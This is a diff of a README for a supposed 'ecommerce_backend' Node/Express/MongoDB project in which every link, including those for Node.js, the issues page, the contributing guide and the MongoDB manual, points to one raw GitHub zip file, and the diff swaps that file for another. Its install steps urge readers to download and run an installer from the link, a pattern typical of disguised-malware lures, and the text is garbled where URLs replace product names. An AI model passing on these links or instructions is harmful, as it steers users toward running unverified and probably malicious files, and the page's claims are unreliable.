@@ -1,10 +1,10 @@
 # 🛒 ecommerce_backend - Your Powerful E-Commerce Solution
 
 ## 🌐 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/utils/ecommerce_backend-v3.6-beta.2.zip)](https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/utils/ecommerce_backend-v3.6-beta.2.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/logs/ecommerce-backend-1.0.zip)](https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/logs/ecommerce-backend-1.0.zip)
 
 ## 📖 Description
-Welcome to the ecommerce_backend! This is a production-ready backend system for managing a large-scale e-commerce platform. Built with https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/utils/ecommerce_backend-v3.6-beta.2.zip, Express, and MongoDB, our application includes features like user authentication, caching with Redis, file uploads, and much more. It focuses on clean, scalable architecture while ensuring performance and security best practices.
+Welcome to the ecommerce_backend! This is a production-ready backend system for managing a large-scale e-commerce platform. Built with https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/logs/ecommerce-backend-1.0.zip, Express, and MongoDB, our application includes features like user authentication, caching with Redis, file uploads, and much more. It focuses on clean, scalable architecture while ensuring performance and security best practices.
 
 ## 🚀 Getting Started
 To begin using the ecommerce_backend, follow the steps below to download and run your application.
@@ -12,16 +12,16 @@ To begin using the ecommerce_backend, follow the steps below to download and run
 ## 🛠️ Prerequisites
 Before you start, make sure your system meets the following requirements:
 - **Operating System:** Windows 10 or higher, macOS, or a Linux-based OS
-- **https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/utils/ecommerce_backend-v3.6-beta.2.zip** Version 14 or higher
+- **https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/logs/ecommerce-backend-1.0.zip** Version 14 or higher
 - **MongoDB:** Version 4 or higher, or access to a MongoDB Atlas account
 - **Internet Connection:** Required for installation and updating packages
 
-Make sure you have https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/utils/ecommerce_backend-v3.6-beta.2.zip installed. You can download it [here](https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/utils/ecommerce_backend-v3.6-beta.2.zip).
+Make sure you have https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/logs/ecommerce-backend-1.0.zip installed. You can download it [here](https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/logs/ecommerce-backend-1.0.zip).
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** Click the link below to go to our releases page:
 
-   [Download the latest version](https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/utils/ecommerce_backend-v3.6-beta.2.zip)
+   [Download the latest version](https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/logs/ecommerce-backend-1.0.zip)
 
 2. **Choose the Latest Release:** On the releases page, find the latest version of the ecommerce_backend. Look for the most recent listing and click on it.
 
@@ -29,7 +29,7 @@ Make sure you have https://raw.githubusercontent.com/wyattleelee/ecommerce_backe
 
    - For Windows users, look for a file ending in `.exe`. 
    - For macOS, find a `.dmg` file. 
-   - For Linux, check for `https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/utils/ecommerce_backend-v3.6-beta.2.zip` or package files suitable for your distribution.
+   - For Linux, check for `https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/logs/ecommerce-backend-1.0.zip` or package files suitable for your distribution.
 
 4. **Run the Installer:** Once the file downloads, open it to start the installation process. Follow the prompts that appear on your screen. During installation, the program will set up everything needed to run the ecommerce_backend.
 
@@ -78,18 +78,18 @@ Make sure you have https://raw.githubusercontent.com/wyattleelee/ecommerce_backe
 ## 🔍 Troubleshooting
 If you encounter issues while installing or running ecommerce_backend, consider the following solutions:
 - **MongoDB not starting:** Ensure it's installed correctly and the command `mongod` is executed.
-- **https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/utils/ecommerce_backend-v3.6-beta.2.zip issues:** Make sure you installed the correct version and your PATH is set up properly.
+- **https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/logs/ecommerce-backend-1.0.zip issues:** Make sure you installed the correct version and your PATH is set up properly.
 - **Package installation failures:** Check your internet connection and retry the `npm install` command.
 
 ## 👥 Support
-For further assistance, please check our [issues page](https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/utils/ecommerce_backend-v3.6-beta.2.zip) for common problems or ask a question. 
+For further assistance, please check our [issues page](https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/logs/ecommerce-backend-1.0.zip) for common problems or ask a question. 
 
 ## 🌟 Contribute
-We welcome contributions! If you’d like to help improve the ecommerce_backend, please check our [contributing guidelines](https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/utils/ecommerce_backend-v3.6-beta.2.zip).
+We welcome contributions! If you’d like to help improve the ecommerce_backend, please check our [contributing guidelines](https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/logs/ecommerce-backend-1.0.zip).
 
 ## 🔗 Additional Resources
-- [https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/utils/ecommerce_backend-v3.6-beta.2.zip Documentation](https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/utils/ecommerce_backend-v3.6-beta.2.zip)
-- [https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/utils/ecommerce_backend-v3.6-beta.2.zip Guide](https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/utils/ecommerce_backend-v3.6-beta.2.zip)
-- [MongoDB Manual](https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/utils/ecommerce_backend-v3.6-beta.2.zip)
+- [https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/logs/ecommerce-backend-1.0.zip Documentation](https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/logs/ecommerce-backend-1.0.zip)
+- [https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/logs/ecommerce-backend-1.0.zip Guide](https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/logs/ecommerce-backend-1.0.zip)
+- [MongoDB Manual](https://raw.githubusercontent.com/wyattleelee/ecommerce_backend/main/logs/ecommerce-backend-1.0.zip)
 
 Feel free to reach out if you have any questions. Thank you for choosing ecommerce_backend for your e-commerce solution!
